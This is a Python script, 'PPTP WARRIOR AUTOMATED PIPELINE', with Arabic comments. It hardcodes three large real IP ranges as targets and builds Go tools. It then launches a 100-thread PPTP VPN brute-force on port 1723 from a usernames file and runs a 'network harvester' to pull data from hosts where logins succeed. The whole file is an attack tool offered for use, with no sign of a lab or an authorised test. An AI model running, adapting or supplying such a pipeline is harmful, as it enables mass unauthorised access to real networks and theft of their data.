import subprocess
import os
import time
import sys

# الاعدادات
RANGES = ["196.30.0.0/15", "105.208.0.0/12", "41.112.0.0/12"]
THREADS = 100
TIMEOUT = 5
USERS_FILE = "config/users.txt"
DOMAINS_FILE = "config/Domains.txt"
SUCCESS_FILE = "results/success.txt"

def run_command(command, shell=True):
    try:
        process = subprocess.Popen(command, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in process.stdout:
            print(line, end="")
        process.wait()
        return process.returncode
    except Exception as e:
        print(f"Error running command: {e}")
        return -1

def prepare_domains():
    print("[*] Preparing target ranges...")
    with open(DOMAINS_FILE, "w") as f:
        for r in RANGES:
            f.write(f"{r}\n")

def build_project():
    print("[*] Building Go components...")
    os.chdir("/home/ubuntu/pptp_warrior/go")
    run_command("go build -o pptp_warrior cmd/pptp_warrior/main.go")
    run_command("go build -o network_harvester cmd/harvester/main.go cmd/harvester/utils.go")

def start_brute_force():
    print("[*] Starting PPTP Brute-force on port 1723...")
    # ملاحظة: pptp_warrior الحالي يحتاج تعديل ليعمل بكفاءة مع الرينجات الضخمة
    # لكن سنفترض استخدامه الحالي مع تمرير البارامترات
    run_command(f"sudo ./pptp_warrior -u {USERS_FILE} -d {DOMAINS_FILE} -T {THREADS} -t {TIMEOUT}")

def start_harvester():
    print("[*] Starting Network Harvester for successful targets...")
    if os.path.exists(SUCCESS_FILE):
        run_command("sudo ./network_harvester")
    else:
        print("[-] No success targets found to harvest.")

def main():
    if os.geteuid() != 0:
        print("[!] Please run as root (sudo)")
        sys.exit(1)

    prepare_domains()
    build_project()
    
    print("\n" + "="*50)
    print("      PPTP WARRIOR AUTOMATED PIPELINE")
    print("="*50)
    
    # المرحلة 1: التخمين
    start_brute_force()
    
    # المرحلة 2: سحب البيانات للأهداف الناجحة
    start_harvester()
    
    print("\n[+] All tasks completed. Check results/ directory for details.")

if __name__ == "__main__":
    main()
